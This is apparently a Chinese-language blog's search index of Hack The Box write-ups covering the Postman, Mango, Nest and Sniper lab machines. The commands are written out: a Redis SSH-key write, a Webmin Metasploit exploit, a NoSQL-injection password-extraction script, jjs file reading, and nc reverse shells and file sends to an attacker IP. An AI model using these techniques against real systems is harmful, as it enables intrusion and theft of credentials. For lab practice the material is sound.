<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HTB-postman</title>
    <url>/2020/04/09/HTB-postman/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -oA path postman.htb</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22&#x2F;tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80&#x2F;tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek&#39;s Personal Website</span><br><span class="line">10000&#x2F;tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-title: Login to Webmin</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>发现19.1版本的webmin，但是多次测试之后发现无法似乎未开启密码重置功能。<br>上网看了一圈 发现nmap未扫到的redis端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE    VERSION                                </span><br><span class="line">6379&#x2F;tcp open  tcpwrapped</span><br></pre></td></tr></table></figure>

<h1 id="redis-未授权访问"><a href="#redis-未授权访问" class="headerlink" title="redis 未授权访问"></a>redis 未授权访问</h1><h2 id="生成ssh公钥，写入redis"><a href="#生成ssh公钥，写入redis" class="headerlink" title="生成ssh公钥，写入redis"></a>生成ssh公钥，写入redis</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">生成ssh公钥</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">写入redis</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;key.txt | redis-cli -h 10.10.10.160 -x set xxx</span><br></pre></td></tr></table></figure>
<h2 id="连接redis-导入公钥"><a href="#连接redis-导入公钥" class="headerlink" title="连接redis,导入公钥"></a>连接redis,导入公钥</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">连接redis</span><br><span class="line">redis-cli -h 10.10.10.160</span><br><span class="line">导入公钥</span><br><span class="line">config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h2 id="ssh连接redis"><a href="#ssh连接redis" class="headerlink" title="ssh连接redis"></a>ssh连接redis</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i &#x2F;root&#x2F;.ssh&#x2F;id_rsa redis@10.10.10.160</span><br></pre></td></tr></table></figure>
<p>查看一下user.txt位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ locate user.txt                   </span><br><span class="line">&#x2F;home&#x2F;Matt&#x2F;user.txt  </span><br><span class="line">redis@Postman:&#x2F;opt$ ls -la &#x2F;home&#x2F;Matt&#x2F;user.txt    </span><br><span class="line">-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 &#x2F;home&#x2F;Matt&#x2F;user.txt</span><br></pre></td></tr></table></figure>
<h2 id="获得Matt私钥"><a href="#获得Matt私钥" class="headerlink" title="获得Matt私钥"></a>获得Matt私钥</h2><p>发现需要获得Matt密码，通过nmap扫描结果可以知道靶机开启了ssh，所以找找Matt的ssh私钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ locate id_rsa*                         </span><br><span class="line">&#x2F;opt&#x2F;id_rsa.bak  </span><br><span class="line">redis@Postman:&#x2F;opt$ ls -la &#x2F;opt&#x2F;id_rsa.bak           </span><br><span class="line">-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 &#x2F;opt&#x2F;id_rsa.bak</span><br></pre></td></tr></table></figure>
<h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><p>使用john在攻击机上进行密码爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py Matt_pass.txt &gt; pass</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt pass</span><br></pre></td></tr></table></figure>
<p>获得Matt用户密码：computer2008  </p>
<h1 id="切换用户，获取flag"><a href="#切换用户，获取flag" class="headerlink" title="切换用户，获取flag"></a>切换用户，获取flag</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis@Postman:&#x2F;opt$ su Matt               </span><br><span class="line">Password:                                           </span><br><span class="line">Matt@Postman:~$ wc -c user.txt              </span><br><span class="line">33 user.txt</span><br></pre></td></tr></table></figure>

<h1 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h1><p>发现webmin为19.1版本，使用msf中的模块获取root</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; search webmin</span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_backdoor) &gt; use exploit&#x2F;linux&#x2F;http&#x2F;webmin_packageup_rce </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; setg username Matt      </span><br><span class="line">username &#x3D;&gt; Matt </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; setg password computer2008 </span><br><span class="line">password &#x3D;&gt; computer2008  </span><br><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; set rhosts 10.10.10.160 </span><br><span class="line">rhosts &#x3D;&gt; 10.10.10.160</span><br></pre></td></tr></table></figure>
<p>值得注意的是需要设置 ssl 为 true<br>否则无法建立连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(linux&#x2F;http&#x2F;webmin_packageup_rce) &gt; set ssl true </span><br><span class="line">ssl &#x3D;&gt; true</span><br></pre></td></tr></table></figure>
<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -c &#x2F;root&#x2F;root.txt</span><br><span class="line">33 &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>HTB-mango</title>
    <url>/2020/04/09/HTB-mango/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="nosql注入-【mangodb】"><a href="#nosql注入-【mangodb】" class="headerlink" title="nosql注入 【mangodb】"></a>nosql注入 【mangodb】</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/95314.html</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads</a></p>
</blockquote>
<h2 id="jjs"><a href="#jjs" class="headerlink" title="jjs"></a>jjs</h2><p>jjs是个基于Nashorn引擎的命令行工具。它接受一些JavaScript源代码为参数，并且执行这些源代码</p>
<blockquote>
<p> <a href="https://gtfobins.github.io/gtfobins/jjs/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/</a></p>
</blockquote>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)</span><br><span class="line">|_  256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)</span><br><span class="line">80&#x2F;tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: 400 Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;staging-order.mango.htb&#x2F;organizationName&#x3D;Mango Prv Ltd.&#x2F;stateOrProvinceName&#x3D;None&#x2F;countryName&#x3D;IN</span><br><span class="line">| Not valid before: 2019-09-27T14:21:19</span><br><span class="line">|_Not valid after:  2020-09-26T14:21:19</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br></pre></td></tr></table></figure>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>浏览站点，没有可用信息<br>发现端口扫描中有个<strong>commonName=staging-order.mango.htb</strong>字段，加入到<strong>/etc/hosts</strong>中，浏览站点。<br><img src="https://img-blog.csdnimg.cn/20200227115618576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何发现这是nosql注入的攻击点呢———-只能说是经验之谈了</p>
<h1 id="Nosql注入"><a href="#Nosql注入" class="headerlink" title="Nosql注入"></a>Nosql注入</h1><p>发现是mango联想到mangodb</p>
<h2 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h2><p><img src="https://img-blog.csdnimg.cn/20200227122418458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200227122545394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="编写用户、密码爆破脚本"><a href="#编写用户、密码爆破脚本" class="headerlink" title="编写用户、密码爆破脚本"></a>编写用户、密码爆破脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">#conding&#x3D;utf-8</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;staging-order.mango.htb&#x2F;index.php&quot;</span><br><span class="line">Cookie &#x3D; &#123;&quot;PHPSESSID&quot; : &quot;junr7pn15rsibkd4q7fjtnrfj7&quot;&#125;</span><br><span class="line">headers &#x3D; &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;</span><br><span class="line">possible_chars &#x3D; list(string.ascii_letters)+list(string.digits)+[&quot;\\&quot;+c for c in string.punctuation+string.whitespace]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_password(name):</span><br><span class="line">    print(&quot;Using &quot;+name+&quot; found password&quot;)</span><br><span class="line">    password &#x3D; &quot;^&quot;</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: name, &quot;password[$regex]&quot;: &quot;&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    while True:</span><br><span class="line">        for char in possible_chars:</span><br><span class="line">            param[&quot;password[$regex]&quot;] &#x3D; password + char + &quot;.*&quot;</span><br><span class="line">            res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">            if int(res.status_code) &#x3D;&#x3D; 302:   </span><br><span class="line">                password +&#x3D; char			# 匹配成功则拼接字符，继续匹配下个字符</span><br><span class="line">                break</span><br><span class="line">        if char &#x3D;&#x3D; possible_chars[-1]:</span><br><span class="line">            print(&quot;Username &quot;+name+&quot; password &quot; + password[1:].replace(&quot;\\&quot;, &quot;&quot;))</span><br><span class="line">    		return password[1:].replace(&quot;\\&quot;, &quot;&quot;)   #剔除转移字符  \ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_name():</span><br><span class="line">    usernames &#x3D; []</span><br><span class="line">    param &#x3D; &#123;&quot;username[$regex]&quot;: &quot;&quot;, &quot;password[$regex]&quot;: &quot;.*&quot;, &quot;login&quot;: &quot;login&quot;&#125;</span><br><span class="line">    for char in possible_chars:</span><br><span class="line">        username &#x3D; &quot;^&quot; + char    </span><br><span class="line">        param[&quot;username[$regex]&quot;] &#x3D; username + &quot;.*&quot;    # 如^a.*，匹配a开头的任意长度字符 </span><br><span class="line">        res &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">        if int(res.status_code) &#x3D;&#x3D; 302:					# 如果该字符匹配成功继续匹配之后的字符</span><br><span class="line">            print(&quot;username start with&quot; + username)</span><br><span class="line">            while True:</span><br><span class="line">                for char2 in possible_chars:</span><br><span class="line">                    param[&quot;username[$regex]&quot;] &#x3D; username + char2 + &quot;.*&quot;</span><br><span class="line">                    res2 &#x3D; requests.post(url&#x3D;url, data&#x3D;param, headers&#x3D;headers, cookies&#x3D;Cookie, allow_redirects&#x3D;False)</span><br><span class="line">                    if int(res2.status_code) &#x3D;&#x3D; 302:		#匹配成功则继续匹配，否则更换字符进行匹配</span><br><span class="line">                        username &#x3D; username + char2</span><br><span class="line">                        print(username)</span><br><span class="line">                        break</span><br><span class="line">                if char2 &#x3D;&#x3D; possible_chars[-1]:    # 匹配到最后一个字符，说明匹配完成</span><br><span class="line">                    print(&quot;Found username &quot; + username[1:])</span><br><span class="line">                    usernames.append(username[1:])  </span><br><span class="line">                    break</span><br><span class="line">  return usernames</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for name in get_name():</span><br><span class="line">	t1 &#x3D; threading.Thread(target&#x3D;get_password,args&#x3D;(name,))</span><br><span class="line">	t1.start()</span><br></pre></td></tr></table></figure>
<h2 id="获得用户、密码"><a href="#获得用户、密码" class="headerlink" title="获得用户、密码"></a>获得用户、密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin   t9KcS3&gt;!0B#2</span><br><span class="line">mango   h3mXK8RhU~f&#123;]f5H</span><br></pre></td></tr></table></figure>

<h1 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h1><p>admin无法直接登录，使用mango登录成功<br>在mango目录下没有flag，在admin目录下发现flag<br>转到admin用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mango@mango:&#x2F;home&#x2F;admin$ ls</span><br><span class="line">user.txt</span><br><span class="line">mango@mango:&#x2F;home&#x2F;admin$ su admin</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>
<h2 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">admin</span><br><span class="line">$ wc -c user.txt</span><br><span class="line">33 user.txt</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ find &#x2F; -user root -perm -4000 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200227124651840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现jjs</p>
<h2 id="使用jjs进行文件读取"><a href="#使用jjs进行文件读取" class="headerlink" title="使用jjs进行文件读取"></a>使用jjs进行文件读取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;var BufferedReader &#x3D; Java.type(&quot;java.io.BufferedReader&quot;);</span><br><span class="line">var FileReader &#x3D; Java.type(&quot;java.io.FileReader&quot;);</span><br><span class="line">var br &#x3D; new BufferedReader(new FileReader(&quot;**&#x2F;root&#x2F;root.txt**&quot;));</span><br><span class="line">while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; print(line); &#125;&#39; | jjs</span><br></pre></td></tr></table></figure>

<h1 id="脚本格式错误"><a href="#脚本格式错误" class="headerlink" title="脚本格式错误"></a>脚本格式错误</h1><p>在windows下编写脚本，复制到linux下，报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为这个文件是直接从别处复制的，可能创建在windows下，多了\r字符。</span><br><span class="line">解决方法</span><br><span class="line">使用VIM打开文本</span><br><span class="line">:set ff 然后回车，我这个文件显示为dos格式。</span><br><span class="line">:set ff&#x3D;unix 回车，设置为unix格式。</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>HTB-nest</title>
    <url>/2020/04/09/HTB-nest/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">445&#x2F;tcp open  microsoft-ds?</span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -7h58m15s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-22T13:12:14</span><br><span class="line">|_  start_date: 2020-02-22T13:08:04</span><br><span class="line">4386&#x2F;tcp open  unknown</span><br></pre></td></tr></table></figure>




<p>SMB linux&amp;windows共享文件</p>
<p>其中：get 只能一个文件一个文件下载。</p>
<p>解决方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb:&#x2F;&gt;recurse on</span><br><span class="line">smb:&#x2F;&gt;prompt off</span><br><span class="line">smb:&#x2F;&gt;mget  *</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>HTB-sniper</title>
    <url>/2020/04/09/HTB-sniper/</url>
    <content><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80&#x2F;tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135&#x2F;tcp open  tcpwrapped</span><br><span class="line">139&#x2F;tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m47s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-24T18:04:23</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure>
<p>浏览网站，发现是文件包含漏洞</p>
<h1 id="文件包含技巧"><a href="#文件包含技巧" class="headerlink" title="文件包含技巧"></a>文件包含技巧</h1><blockquote>
<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
</blockquote>
<p>发现得使用smb进行远程文件包含</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/5139" target="_blank" rel="noopener">https://xz.aliyun.com/t/5139</a></p>
</blockquote>
<h1 id="上传nc获得反弹shell"><a href="#上传nc获得反弹shell" class="headerlink" title="上传nc获得反弹shell"></a>上传nc获得反弹shell</h1><p><img src="https://img-blog.csdnimg.cn/20200225164711779.png" alt="在这里插入图片描述"></p>
<blockquote>
<p><a href="https://www.cnblogs.com/broadview/archive/2010/10/27/1862836.html" target="_blank" rel="noopener">https://www.cnblogs.com/broadview/archive/2010/10/27/1862836.html</a></p>
</blockquote>
<h1 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h1><h2 id="发现密码"><a href="#发现密码" class="headerlink" title="发现密码"></a>发现密码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\inetpub\wwwroot\user&gt;type db.php</span><br><span class="line">type db.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; Enter your Host, username, password, database below.</span><br><span class="line">&#x2F;&#x2F; I left password empty because i do not set password on localhost.</span><br><span class="line">$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz&#x2F;B8xQ~2VM&quot;,&quot;sniper&quot;);</span><br><span class="line">&#x2F;&#x2F; Check connection</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\users&gt; dir</span><br><span class="line">d-----         4&#x2F;9&#x2F;2019   6:47 AM                Administrator    </span><br><span class="line">d-----        4&#x2F;11&#x2F;2019   7:04 AM                Chris       </span><br><span class="line">d-r---         4&#x2F;9&#x2F;2019   6:47 AM                Public</span><br></pre></td></tr></table></figure>
<h2 id="更改nc权限"><a href="#更改nc权限" class="headerlink" title="更改nc权限"></a>更改nc权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Get-Acl 查看文件权限</span><br><span class="line">&gt; PS C:\tmp&gt; cacls .&#x2F;nc.exe &#x2F;t &#x2F;e &#x2F;g everyone:f         </span><br><span class="line">cacls .&#x2F;nc.exe &#x2F;t &#x2F;e &#x2F;g everyone:f                           </span><br><span class="line">processed file: C:\tmp\nc.exe</span><br></pre></td></tr></table></figure>
<h2 id="获取user的powershell"><a href="#获取user的powershell" class="headerlink" title="获取user的powershell"></a>获取user的powershell</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$username &#x3D; &#39;sniper\chris&#39;</span><br><span class="line">$Password &#x3D; ConvertTo-SecureString &quot;36mEAhz&#x2F;B8xQ~2VM&quot; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential($UserName,$Password)</span><br><span class="line">Invoke-Command  -ScriptBlock &#123; C:\tmp\nc.exe 10.10.15.172 7777 -e powershell.exe &#125; -Credential $cred -Verbose -computer localhost</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。</span><br><span class="line"></span><br><span class="line">powershell set-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.jb51.net/article/131535.htm" target="_blank" rel="noopener">https://www.jb51.net/article/131535.htm</a></p>
</blockquote>
<h2 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\users\chris\desktop&gt; dir</span><br><span class="line">Mode                LastWriteTime         Length Name          </span><br><span class="line">----                -------------         ------ ----  </span><br><span class="line">-a----        4&#x2F;11&#x2F;2019   8:15 AM             32 user.txt</span><br></pre></td></tr></table></figure>

<h1 id="windows下使用nc传输文件"><a href="#windows下使用nc传输文件" class="headerlink" title="windows下使用nc传输文件"></a>windows下使用nc传输文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Chris\downloads&gt; C:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm </span><br><span class="line">c;CC:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm </span><br><span class="line">At line:1 char:37</span><br><span class="line">+ c;CC:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm</span><br><span class="line">+                                     ~</span><br><span class="line">The &#39;&lt;&#39; operator is reserved for future use.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : RedirectionNotSupported</span><br></pre></td></tr></table></figure>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Chris\downloads&gt; &amp; cmd.exe &#x2F;c &quot;C:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm &quot;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>hello</title>
    <url>/2020/02/27/hello/</url>
    <content><![CDATA[<hr>
<h2 id="Hello"><a href="#Hello" class="headerlink" title="Hello "></a>Hello </h2>]]></content>
  </entry>
</search>
